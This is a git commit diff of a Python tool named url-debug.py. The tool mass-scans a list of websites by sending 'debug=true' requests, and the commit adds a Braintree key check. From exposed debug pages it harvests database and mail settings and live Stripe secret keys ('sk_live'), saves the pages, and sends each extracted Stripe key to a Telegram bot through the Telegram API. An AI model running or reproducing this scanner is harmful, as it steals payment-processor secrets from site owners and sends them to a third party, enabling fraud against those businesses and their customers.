df4f3cb557924c4b4026d47fa2bcfff80b0a8889
faouzikr <147516160+faouzikr@users.noreply.github.com>
2024-06-24 12:13:39 +0100

    Update url-debug.py

--- url-debug.py
+++ url-debug.py
@@ -21,34 +21,39 @@ class xcol:
     RESET = '\u001B[0m'
     LXC = '\033[38;2;255;152;0m'
     GREY = '\033[38;2;158;158;158m'
-class ENV :
-   def scan (self, url):
-      rr = ''
-      mch = ['DB_HOST', 'MAIL_HOST', 'DB_CONNECTION', 'MAIL_USERNAME','sk_live', 'APP_DEBUG']
-      try:
-         data = {'debug': 'true'}
-         r = requests.post(f'https://{url}', data=data, allow_redirects=False, verify=False, timeout=10)
-         resp = r.text
-         if any(key in resp for key in mch):
-            rr = f'{xcol.LGREEN}[+]{xcol.RESET} : https://{url}'
-            with open(os.path.join('DEBUG', f'{url}_debug.htm'), 'w', encoding='utf-8') as output:
-               output.write(f'{resp}\n')
-            if "sk_live" in resp:
-               with open(os.path.join('SK', f'{url}_debug.htm'), 'w', encoding='utf-8') as output:
-                  output.write(f'{resp}\n')
-               matches = re.findall(pattern, resp)
-               for match in matches:
-                  sk_live = f"sk_live_{match}"
-                  print("Found matching content:",sk_live)
-                  hit_sender = requests.get(f"https://api.telegram.org/bot{Bot_TOKEN}/sendMessage?chat_id={USER_ID}&text={sk_live}&parse_mode=HTML")
-         else :
-            rr = f'{xcol.LXC}[-] :{xcol.RESET} https://{url}'
-      except :
-         rr = f'{xcol.LRED}[*] :{xcol.RESET} https://{url}'
-      print(rr)
+
+class ENV:
+    def scan(self, url):
+        rr = ''
+        mch = ['DB_HOST', 'MAIL_HOST', 'DB_CONNECTION', 'MAIL_USERNAME', 'sk_live', 'APP_DEBUG', 'BRAINTREE_PUBLIC_KEY']
+        try:
+            data = {'debug': 'true'}
+            r = requests.post(f'https://{url}', data=data, allow_redirects=False, verify=False, timeout=10)
+            resp = r.text
+            if any(key in resp for key in mch):
+                rr = f'{xcol.LGREEN}[+]{xcol.RESET} : https://{url}'
+                with open(os.path.join('DEBUG', f'{url}_debug.htm'), 'w', encoding='utf-8') as output:
+                    output.write(f'{resp}\n')
+                if "sk_live" in resp:
+                    with open(os.path.join('SK', f'{url}_debug.htm'), 'w', encoding='utf-8') as output:
+                        output.write(f'{resp}\n')
+                    matches = re.findall(pattern, resp)
+                    for match in matches:
+                        sk_live = f"sk_live_{match}"
+                        print("Found matching content:", sk_live)
+                        requests.get(f"https://api.telegram.org/bot{Bot_TOKEN}/sendMessage?chat_id={USER_ID}&text={sk_live}&parse_mode=HTML")
+                if "BRAINTREE_PUBLIC_KEY" in resp:
+                    with open('Braintree.txt', 'a') as file_object:
+                        file_object.write(f'Braintree : {url}\n')
+            else:
+                rr = f'{xcol.LXC}[-] :{xcol.RESET} https://{url}'
+        except:
+            rr = f'{xcol.LRED}[*] :{xcol.RESET} https://{url}'
+        print(rr)
+
 if __name__ == '__main__':
-   os.system('clear')
-   print(""" \033[38;2;158;158;158m
+    os.system('clear')
+    print(""" \033[38;2;158;158;158m
 ██╗   ██╗██████╗ ██╗         ██████╗ ███████╗██████╗ ██╗   ██╗ ██████╗  ██████╗ ███████╗██████╗ 
 ██║   ██║██╔══██╗██║         ██╔══██╗██╔════╝██╔══██╗██║   ██║██╔════╝ ██╔════╝ ██╔════╝██╔══██╗
 ██║   ██║██████╔╝██║         ██║  ██║█████╗  ██████╔╝██║   ██║██║  ███╗██║  ███╗█████╗  ██████╔╝
@@ -58,26 +63,26 @@ if __name__ == '__main__':
                                                                                                 
 
   \u001B[0m""")
-   if not os.path.isdir("DEBUG"):
-      os.makedirs("DEBUG")
-   if not os.path.isdir("SK"):
-      os.makedirs("SK")
-   threads = []
-   while(True):
-      try:
-         thrd = int(input(xcol.GREY+"[THREAD] : "+xcol.RESET))
-         break
-      except:
-         pass
-   while(True):
-      try:
-         inpFile = input(xcol.GREY+"[URLS PATH] : "+xcol.RESET)
-         with open(inpFile) as urlList:
-            argFile = urlList.read().splitlines()
-         break
-      except:
-         pass
-   with ThreadPoolExecutor(max_workers=thrd) as executor:
-      for data in argFile:
-         threads.append(executor.submit(ENV().scan, data))
-   quit()
+    if not os.path.isdir("DEBUG"):
+        os.makedirs("DEBUG")
+    if not os.path.isdir("SK"):
+        os.makedirs("SK")
+    threads = []
+    while True:
+        try:
+            thrd = int(input(xcol.GREY + "[THREAD] : " + xcol.RESET))
+            break
+        except:
+            pass
+    while True:
+        try:
+            inpFile = input(xcol.GREY + "[URLS PATH] : " + xcol.RESET)
+            with open(inpFile) as urlList:
+                argFile = urlList.read().splitlines()
+            break
+        except:
+            pass
+    with ThreadPoolExecutor(max_workers=thrd) as executor:
+        for data in argFile:
+            threads.append(executor.submit(ENV().scan, data))
+    quit()
